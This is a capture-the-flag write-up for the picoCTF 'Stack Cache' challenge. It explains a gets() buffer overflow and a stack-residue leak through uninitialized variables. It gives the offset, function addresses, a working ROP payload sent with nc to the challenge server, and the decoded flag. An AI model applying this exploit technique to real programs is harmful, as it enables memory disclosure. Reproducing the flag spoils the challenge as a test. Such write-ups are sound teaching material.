# Stack Cache — picoCTF (Binary Exploitation, Hard)

## Overview

A vulnerable program has three functions: `vuln()` with a buffer overflow via `gets()`, `win()` that reads the flag into a stack buffer but never prints it, and `UnderConstruction()` that prints uninitialized stack variables. By chaining `win` → `UnderConstruction` via a ROP chain, the flag data left on the stack by `win` is leaked through the uninitialized pointers in `UnderConstruction`.

## Analysis

### Source code review

```c
void win() {
    char buf[64];
    char filler[16];
    FILE *f = fopen("flag.txt","r");
    fgets(buf, 64, f);    // reads flag into stack — but never prints it
}

void UnderConstruction() {
    char consideration[16];
    char *demographic, *location, *identification, *session, *votes, *dependents;
    char *p, *q, *r;
    unsigned long *age;
    // all uninitialized — will contain whatever was on the stack before
    printf("User information : %p %p %p %p %p %p\n", ...);
    printf("Names of user: %p %p %p\n", p, q, r);
    printf("Age of user: %p\n", age);
}

void vuln() {
    char buf[10];
    gets(buf);             // buffer overflow
}
```

The key insight: `win()` reads the flag onto the stack. When `win` returns, the stack frame is deallocated but the **data remains in memory**. If `UnderConstruction` is called next, its uninitialized local variables occupy the same stack region and inherit the flag bytes, which are then printed via `%p`.

### Binary protections

32-bit ELF, no PIE, no stack canary — straightforward ROP.

### Finding addresses

```bash
$ objdump -t vuln | grep -E " win| Under| vuln"
08049d90 g     F .text  0000007a  win
08049e10 g     F .text  00000094  UnderConstruction
08049eb0 g     F .text  00000039  vuln
```

### Finding the offset

Using a pattern in GDB to identify which bytes overwrite the return address:

```
(gdb) run <<< $(python3 -c "print('AAABBBCCCDDDEEEFFFGGGHHHIIIJJJ')")
Program received signal SIGSEGV, Segmentation fault.
0x46464645 in ?? ()
```

`0x46464645` = `"EFFF"` in ASCII, starting at byte 13 in the pattern. After testing, the correct offset is **14 bytes**.

## Exploit

ROP chain: overflow → `win` (reads flag to stack) → `UnderConstruction` (leaks stack residue).

```bash
$ python3 -c "import sys; sys.stdout.buffer.write(b'A'*14 + b'\x90\x9d\x04\x08' + b'\x10\x9e\x04\x08' + b'\n')" | nc saturn.picoctf.net 57436
Give me a string that gets you the flag
AAAAAAAAAAAAAA
User information : 0x80c9a04 0x804007d 0x36343532 0x37383139 0x5f597230 0x6d334d5f
Names of user: 0x50755f4e 0x34656c43 0x7b465443
Age of user: 0x6f636970
```

### Decoding the flag

Each `%p` value contains 4 bytes of the flag in little-endian order. Reading from `Age` backwards through the leaked pointers and reversing byte order:

| Pointer | Hex | ASCII (little-endian) |
|---------|-----|----------------------|
| Age | `0x6f636970` | `pico` |
| Names[2] | `0x7b465443` | `CTF{` |
| Names[1] | `0x34656c43` | `Cle4` |
| Names[0] | `0x50755f4e` | `N_uP` |
| User[5] | `0x6d334d5f` | `_M3m` |
| User[4] | `0x5f597230` | `0rY_` |
| User[3] | `0x37383139` | `9187` |
| User[2] | `0x36343532` | `2546` |

**Flag:** `picoCTF{Cle4N_uP_M3m0rY_91872546}`

## Tools used

- `objdump -t` — find function addresses in symbol table
- `gdb` — determine buffer overflow offset using pattern injection
- `python3` — generate binary payload with ROP chain
- `nc` — connect to remote server

## Key takeaway

When a function returns, its local variables are not zeroed — the data persists on the stack as "residue". If another function reuses the same stack region with uninitialized variables, it inherits the old data. This is a real-world vulnerability class: **uninitialized stack variable information disclosure**. The exploit chains two function calls via ROP to first place sensitive data on the stack, then leak it through a second function's uninitialized variables.
